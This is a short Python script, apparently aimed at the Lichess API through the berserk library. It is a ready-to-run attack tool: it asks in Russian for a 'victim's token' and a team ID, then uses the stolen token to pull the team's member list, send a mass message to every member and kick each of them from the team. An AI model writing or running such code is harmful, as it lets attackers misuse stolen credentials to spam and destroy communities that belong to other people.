import berserk
import ndjson
import requests

from config import *


def hack(token, team):
    heads = {'Authorization': f'Bearer {token}'}

    session = berserk.TokenSession(token)
    client = berserk.Client(session=session)

    r = requests.get(f'https://{SERVER}/api/{TEAM}/' + team + f'/{USERS}')
    data = r.json(cls=ndjson.Decoder)

    print(green + "[+] Список пользователей получен!")

    session.post(f'https://{SERVER}/{TEAM}/' + team + f'/{PM_ALL}', data={'message': msg}, headers=heads).json()
    print("[+] Рассылка успешна отправлена!")

    for i in data:
        user = i['username']
        client.teams.kick_member(team, user)
        print(f"[+] {user} кикнут!")


if __name__ == "__main__":
    hack(token=input(magenta + "[?] Введите токен жертвы: "), team=input(magenta + "[?] ID команды: "))
